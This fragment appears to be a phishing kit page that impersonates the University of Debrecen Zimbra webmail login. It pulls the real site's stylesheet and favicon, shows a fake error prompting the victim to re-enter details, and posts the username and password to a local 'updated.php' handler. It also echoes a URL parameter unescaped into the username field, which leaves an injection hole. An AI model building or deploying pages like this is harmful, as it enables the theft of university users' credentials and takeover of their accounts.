...
$email =   "";
   ...
   if (empty($_POST["sessi"])) {
     $emailErr = "Email is required";
   } else {
     $email = test_input($_POST["sessi"]);
...
-->
	...
	<link rel="stylesheet" type="text/css" href="https://zimbra.unideb.hu/zimbra/css/common,login,zhtml,skin.css?skin=harmony&v=170531152432">
	<link rel="SHORTCUT ICON" href="https://zimbra.unideb.hu/zimbra/img/logo/favicon.ico">
	...
	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">
				...
				<form method="post" name="loginForm" action="updated.php" accept-charset="UTF-8">
								<p>
								  <input type="hidden" name="loginOp" value="login"/>
								  <input type="hidden" name="login_csrf" value="a7b311aa-8df8-45d6-9752-c2845c42478b"/>
                  <span class="a2"><span class="a1">Error: Please fill your email information correctly!!</span></span><span class="a1">.</span></p>
				  <p>&nbsp; </p>
				  <table class="form">
          <tr>
                                        <td><label for="username">Username:</label></td>
                                        <td><input id="rcmloginuser" class="zLoginField" name="username" type="text" value="<?php echo $_GET['sessi']; ?>" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
                                        </tr>
                                        <tr>
                                <td><label for="password">Password:</label></td>
                                <td><input id="rcmloginpwd" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"/></td>
                                </tr>
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
...
,hideSearchInCompose:true,notificationBanner:"/zimbra/skins/_base/logos/NotificationBanner_grey.gif?v=170531152434",socialfox:{
